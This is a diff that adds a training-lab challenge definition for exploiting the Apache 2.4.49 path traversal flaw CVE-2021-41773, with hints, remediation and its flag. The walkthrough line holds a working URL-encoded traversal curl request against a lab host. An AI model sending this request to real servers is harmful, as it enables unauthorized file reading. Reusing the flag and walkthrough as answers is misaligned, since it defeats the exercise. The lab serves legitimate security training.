@@ -1,0 +1,36 @@
+slug: ewpt-apache-2449-traversal
+name: Apache 2.4.49 Path Traversal (EWPT)
+category: web
+difficulty: medium
+lab_kind: static
+flag: FLAG{apache_2449_path_traversal}
+est_minutes: 20
+sort: 107
+description: |-
+  `http://cms.lab.local:8082` runs Apache 2.4.49. The flag is at `/flag.txt`, outside the web root.
+
+  **Objective:** Exploit CVE-2021-41773 path traversal to read `/flag.txt`.
+
+  **Exam topics:** Apache 2.4.49; path traversal; service version enumeration.
+
+  _Isolated lab only (`*.lab.local` or your own Docker/VMs). Never expose these vulnerable services to the internet._
+objectives:
+- Confirm the service version
+- Build a URL-encoded traversal request
+- Understand why --path-as-is matters
+hints:
+- level: 1
+  cost: 0
+  body: Confirm the version with nmap -sV or the response headers.
+- level: 2
+  cost: 5
+  body: Use URL-encoded .. traversal.
+- level: 3
+  cost: 10
+  body: Target /cgi-bin/ or /icons/ if enabled.
+remediation: Patch Apache; disable unnecessary CGI; restrict filesystem access.
+walkthrough: curl --path-as-is "http://cms.lab.local:8082/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt" returns
+  the flag.
+references:
+- title: NVD - CVE-2021-41773
+  url: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
